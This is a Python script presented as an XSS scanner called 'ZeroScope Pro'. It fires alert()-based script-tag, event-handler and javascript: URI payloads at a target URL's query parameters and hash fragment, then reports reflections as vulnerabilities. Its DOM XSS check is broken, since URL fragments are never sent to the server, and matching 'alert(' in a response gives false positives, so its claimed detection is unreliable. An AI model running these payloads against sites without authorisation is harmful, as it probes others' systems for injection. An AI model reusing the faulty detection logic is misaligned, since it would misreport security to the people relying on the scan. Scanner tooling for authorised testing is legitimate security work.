#!/usr/bin/env python3
"""
ZeroScope Pro - Effective XSS Scanner with DOM/Reflected Detection
"""

import argparse
import requests
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

class ZeroScope:
    def __init__(self):
        init()
        self.banner = f"""{Fore.CYAN}
███████╗███████╗██████╗ ░█████╗ ░██████╗░█████╗░░█████╗░██████╗░███████╗
╚════██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
░░███╔═╝█████╗░░██████╔╝██║░░██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝█████╗░░
██╔══╝░░██╔══╝░░██╔══██╗██║░░██║░╚═══██╗██║░░██╗██║░░██║██╔═══╝░██╔══╝░░
███████╗███████╗██║░░██║╚█████╔╝██████╔╝╚█████╔╝╚█████╔╝██║░░░░░███████╗
╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚══════╝
{Style.RESET_ALL}"""
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'ZeroScope/2.0'}
        self.vulnerabilities = []

    def test_dom_xss(self, url):
        """Test for DOM XSS using hash payloads"""
        payloads = [
            ("#<script>alert('DOM_XSS')</script>", "DOM Injection", "High"),
            ("#javascript:alert('DOM_XSS')", "JS URI Injection", "High"),
            ("#'><img src=x onerror=alert('DOM_XSS')>", "DOM Breakout", "Medium")
        ]
        
        for payload, vuln_type, severity in payloads:
            test_url = f"{url}{payload}"
            try:
                response = self.session.get(test_url, timeout=5)
                if "DOM_XSS" in response.text or "alert(" in response.text:
                    self.vulnerabilities.append({
                        'url': test_url,
                        'type': f"DOM XSS ({vuln_type})",
                        'severity': severity,
                        'payload': payload
                    })
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Error testing DOM XSS: {e}{Style.RESET_ALL}")

    def test_reflected_xss(self, url):
        """Test for reflected XSS in parameters"""
        payloads = [
            ("<script>alert('XSS')</script>", "Basic Script Tag", "Critical"),
            ("\" onmouseover=alert('XSS') ", "Event Handler", "High"),
            ("'><svg/onload=alert('XSS')>", "Tag Breakout", "High"),
            ("javascript:alert('XSS')", "JS URI", "Medium")
        ]
        
        parsed = urlparse(url)
        if parsed.query:
            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
            for param in params:
                for payload, vuln_type, severity in payloads:
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
                    try:
                        response = self.session.get(test_url)
                        if payload in response.text:
                            self.vulnerabilities.append({
                                'url': test_url,
                                'type': f"Reflected XSS ({vuln_type})",
                                'severity': severity,
                                'payload': payload
                            })
                    except Exception as e:
                        print(f"{Fore.YELLOW}[!] Error testing {param}: {e}{Style.RESET_ALL}")
        else:
            # Test with default parameter if no query exists
            for payload, vuln_type, severity in payloads:
                test_url = f"{url}?test={quote(payload)}"
                try:
                    response = self.session.get(test_url)
                    if payload in response.text:
                        self.vulnerabilities.append({
                            'url': test_url,
                            'type': f"Reflected XSS ({vuln_type})",
                            'severity': severity,
                            'payload': payload
                        })
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Error testing reflected XSS: {e}{Style.RESET_ALL}")

    def scan(self, url):
        """Main scanning function"""
        print(self.banner)
        print(f"{Fore.GREEN}[+] Testing: {url}{Style.RESET_ALL}")
        
        # Test both DOM and Reflected XSS
        self.test_dom_xss(url)
        self.test_reflected_xss(url)
        
        self.report_results()

    def report_results(self):
        """Display scan results with type and severity"""
        print(f"\n{Fore.CYAN}=== Scan Results ==={Style.RESET_ALL}")
        
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}[✓] No vulnerabilities found{Style.RESET_ALL}")
            return
            
        print(f"{Fore.RED}[!] Found {len(self.vulnerabilities)} vulnerabilities:{Style.RESET_ALL}")
        for i, vuln in enumerate(self.vulnerabilities, 1):
            severity_color = Fore.RED if vuln['severity'] in ['Critical','High'] else Fore.YELLOW
            print(f"\n{i}. {Fore.CYAN}{vuln['url']}{Style.RESET_ALL}")
            print(f"   {Fore.WHITE}Type: {vuln['type']}{Style.RESET_ALL}")
            print(f"   {severity_color}Severity: {vuln['severity']}{Style.RESET_ALL}")
            print(f"   Payload: {Fore.MAGENTA}{vuln['payload']}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='ZeroScope XSS Scanner')
    parser.add_argument('xss', help='XSS scanning mode')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    
    args = parser.parse_args()
    
    scanner = ZeroScope()
    scanner.scan(args.url)

if __name__ == "__main__":
    from urllib.parse import parse_qs, urlencode, urlunparse
    main()
